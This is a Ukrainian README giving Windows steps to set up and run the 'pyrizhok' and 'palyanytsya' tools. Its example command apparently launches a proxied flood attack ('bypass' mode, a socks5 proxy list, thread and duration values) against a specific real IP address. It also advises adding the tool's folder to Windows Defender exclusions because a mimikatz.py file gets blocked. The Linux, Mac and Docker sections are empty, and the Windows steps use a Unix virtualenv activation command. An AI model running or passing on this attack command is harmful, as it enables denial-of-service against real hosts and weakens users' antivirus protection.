# 🥡 Запуск вихідного коду

У цьому документі зібрані інструкції щодо того, як можна запустити пиріжок та паляницю з вихідного коду, без створення білдів.

Зважаючи на те, що команди мають певні відмінності в залежності від платфоми, оберіть гайд під свою платфому:

- [Windows](#windows)
- [Linux](#linux)
- [Mac](#mac)
- [Docker](#docker)

---

## <a name="windows"></a>💻 Windows

Щоб запустити софт на Windows:

1. Встановіть [Git][git-download-windows].

2. Встановіть [Python 3.10.2][python-3.10.2-download].
   > **⚠** Паляниця з пиріжком потребують версію Python не менше ніж [**3.10.2**][python-3.10.2-download].

3. Перейдіть до папки, в яку ви завантажете паляницю. Наприклад:
   ```shell
   cd "C:\Users\USER_NAME\Downloads"
   ```
   > **💡** Щоб легко знайти повний шлях до бажаної папки, перейдіть до неї в Провіднику та скопіюйте адресу звідти. Потім перейдіть до цієї папки в cmd додавши ії до команди cd (як у прикладі вище).

4. Відкрийте командний рядок: 
   - натисніть **_Win+R_**
   - у з‘явившемуся вікні введіть: **_cmd_**
   - натисніть **_Enter_**

5. Завантажте проект:
   ```shell
   git clone https://github.com/pocket-sunflower/palyanytsya.git
   ```
   
6. Перейдіть до папки проекту:
   ```shell
   cd palyanytsya
   ```

7. Встановіть [**_virtualenv_**][virtualenv] за допомогою **_pip_**:
   ```shell
   pip install virtualenv
   ```

8. Створіть віртуальне середовище:
   ```shell
   virtualenv --python python3.10 venv
   ```
   
9. Активуйте віртуальне середовище:
   ```shell
   source venv/bin/activate
   ```
   
10. Встановіть залежності:
    ```shell
    pip install -r requirements.txt
    ```
    > **ℹ** Якщо ви працюєте на Windows 10, можлива помилка при встановленні бібліотеки [impacket][impacket]. Причина в тому, що це бібліотека для аналізу мережевих пакетів, яка може блокуватися Windows Defender (а саме, блокується файл _mimikatz.py_). Щоби позбігтися помилок при встановленні залежностей, [додайте папку з паляницею до списку винятків Windows Defender][windows-defender-exception]. Після цього, запустіть команду знову.

11. Все готове до запуску! Запустіть **пиріжок**:
    ```shell
    python pyrizhok.py
    ```
    …або **паляницю**:
    ```shell
    python palyanytsya.py bypass 194.85.30.210 5 100 socks5.txt 10000 3600
    ```

---

## <a name="linux"></a>🐧 Linux

Щоб запустити софт на Linux:

---

## <a name="mac"></a>🍎 Mac

Щоб запустити софт на Mac:

---

## <a name="docker"></a>🐋 Docker

Щоб запустити софт на Docker:

---

[< back](../README.md)

<!--- References --->
[virtualenv]: https://virtualenv.pypa.io/en/latest/
[git-download-windows]: https://git-scm.com/download/win
[python-3.10.2-download]: https://www.python.org/downloads/release/python-3102/
[impacket]: https://pypi.org/project/impacket/
[windows-defender-exception]: https://support.microsoft.com/uk-ua/windows/%D0%B4%D0%BE%D0%B4%D0%B0%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D0%B8%D0%BD%D1%8F%D1%82%D0%BA%D1%83-%D0%B4%D0%BE-%D1%81%D0%BB%D1%83%D0%B6%D0%B1%D0%B8-%D0%B1%D0%B5%D0%B7%D0%BF%D0%B5%D0%BA%D0%B0-%D1%83-windows-811816c0-4dfd-af4a-47e4-c301afe13b26
